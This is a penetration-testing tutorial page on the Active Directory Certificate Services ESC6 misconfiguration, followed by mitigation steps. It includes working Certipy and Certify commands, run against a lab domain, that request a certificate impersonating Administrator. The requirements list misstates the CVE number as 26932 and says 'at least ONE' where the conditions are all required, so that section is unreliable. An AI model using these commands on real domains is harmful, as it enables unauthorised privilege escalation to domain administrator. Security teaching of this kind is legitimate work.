# ESC6

## Description <a href="#description" id="description"></a>

ESC6 occurs when a Certificate Authority (CA) has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled in its configuration. This flag allows certificate requesters to specify arbitrary Subject Alternative Name (SAN) values. If Microsoft’s May 2022 security update for [CVE-2022-26923](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-26923) has not been applied, the CA may be vulnerable to privilege escalation.

Under these conditions, any certificate template that supports Client Authentication and is enrollable by low-privileged users becomes a potential attack vector. This makes ESC6 similar in effect to ESC1, as an attacker can request a certificate with a forged SAN, impersonating a privileged user. Even the default "User" template could be exploited in this manner, allowing a standard domain user to escalate to a domain administrator.

### Requirements for attack path <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

Access to an account that has at least ONE of the following permissions over a template:

* The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set.
* Security patch for CVE-2022-26932 has not been applied to the CA
* Access to an account which is permitted to enroll in a template which also supports Client Authentication. (The default user template is sufficient in most cases).

## Linux

### Enumeration

{% code overflow="wrap" %}
```python
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.231.141 -vulnerable -stdout
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Performing the attack

{% code overflow="wrap" %}
```python
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.231.141 -ca lab-LAB-DC-CA -template User -upn Administrator@lab.local 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Once retrieved we can follow the remainder of the steps as per ESC1.&#x20;

{% content-ref url="esc1.md" %}
[esc1.md](esc1.md)
{% endcontent-ref %}



## Windows

### Enumeration

Certify can be used to check the Certificate Authorities for the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

```powershell
.\Certify.exe cas
```

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Performing the attack

The steps to perform the attack are almost identical to ESC1 except we pick the default "User" template or any other candidate template if required.

{% code overflow="wrap" %}
```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /altname:Administrator
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

After retrieval, we can follow the remainder of the steps within ESC1 to complete the attack.

{% content-ref url="esc1.md" %}
[esc1.md](esc1.md)
{% endcontent-ref %}

## Mitigations

* Remove the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` from the Certificate Authority.

Run the following on the Certificate Authority as Domain Administrator.

```
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

After doing so, restart the service to allow changes to take place.

```
net stop certsvc & net start certsvc
```
